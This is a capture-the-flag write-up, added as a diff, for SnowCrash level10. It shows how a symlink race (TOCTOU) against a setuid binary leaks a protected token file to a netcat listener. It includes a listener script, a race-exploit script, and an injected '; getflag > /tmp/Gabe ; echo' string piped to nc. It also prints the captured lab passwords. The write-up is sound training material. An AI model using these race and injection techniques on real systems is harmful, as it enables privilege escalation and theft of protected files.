@@ -1,0 +1,121 @@
+# Okay lets see what we have by doing a ls -la
+
+level10@SnowCrash:~$ ls -la
+total 28
+dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
+d--x--x--x  1 root    users     340 Aug 30  2015 ..
+-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
+-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
+-r-x------  1 level10 level10   675 Apr  3  2012 .profile
+-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
+-rw-------  1 flag10  flag10     26 Mar  5  2016 token
+
+# Lets see what happens when running the file
+
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it
+
+# Lets see whats happens when giving it token
+
+level10@SnowCrash:~$ ./level10 token
+./level10 file host
+	sends file to host if you have access to it
+
+# Lets see what in token
+
+level10@SnowCrash:~$ cat token
+cat: token: Permission denied
+
+#	It we run strings on level10 we see that it uses port 6969
+
+# Lets see if we can exploit it with echo and using nc with our port 5151,  and give us the password too and 6969 only gives the flag
+#	Note localhost 5151 is home in networking
+echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+
+level10@SnowCrash:~$ echo '; getflag > /tmp/Gabe ; echo' | nc localhost 5151 && cat /tmp/Gabe
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+# OOPS this did not work. when I enter the password it did not work		## Side note this was level11 exploit as I found out when I completed level11
+
+# 	Okay but it wasn't a complete waste and we show that we are on the correct path and we need to use port 6969 instead
+
+# Lets run it one more time
+level10@SnowCrash:~$ ./level10
+./level10 file host
+	sends file to host if you have access to it ## This is the key giveaway!
+
+#	It is expecting that the client to be listing privor to running `./level10`.
+#	The problem is nc expects the sever to be running privor to the client connecting 
+#		Hence there is a race condition between the two.
+
+# We can prove this with the following commands
+#	You need 2 terminals ssh into the vm
+
+# VM 1 run
+level10@SnowCrash:~$ while :; do nc -l 6969; done
+.*( )*.
+
+# VM 2 run
+level10@SnowCrash:~$ touch /tmp/token10; while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+
+# We see that we are on the right path!
+
+# So we open a shell on which we listen in loop with the following command:
+#	while [42]; do nc-1 6969; therefore
+
+vim listener.sh
+
+#!/bin/sh
+while [ 42 ] ; do nc -l 6969; done
+
+# We create a shell script that will try to exploit this race condition: It will call the binary between two calls to ln to try to 
+#	change the symbolic link running. We see the following password in our second shell:
+
+vim raceExploit.sh
+#!/bin/sh
+touch /tmp/gabe														# Note gabe is a place holder file just use to exploit the race condition
+  while true; do
+       ln -sf /tmp/gabe /tmp/copyToken  &							# This will symlink the files then will remove it after
+       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &		# using the now symlink file to slow down the process of ./level10 excecuteable
+       ln -sf /home/user/level10/token /tmp/copyToken &				# symlink the token file with our file in hopes that the race condition is triggered and the program runs our token with it linked to their token. Remember that the system is slowed down so that timing events don't run as they should.
+  done
+
+# Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
+# 	Run the listener.sh first on the one.
+#		On the other run raceExploit.sh
+#	once you see the below then stop the listener.sh with control c
+
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+^C
+
+# The above is your password for the flag10
+
+level10@SnowCrash:~$ su flag10
+Password: woupa2yuojeeaaed06riuj63c
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+
+# What we learnt
+# The point of this exercise is to trick the program
+#	by switching out the file while the program is running. Hence a race condition.
+# We learnt about race conditions
+
+
+### NOTE that flag10 woupa2yuojeeaaed06riuj63c works for flag11
+
+Resources
+https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
+https://linux.die.net/man/1/nc
+https://linux.die.net/man/1/ln
+https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false
+https://www.lifewire.com/uses-of-commands-nice-renice-2201087
+https://www.mattandreko.com/2011/12/11/exploit-exercises-nebula-10/
+https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
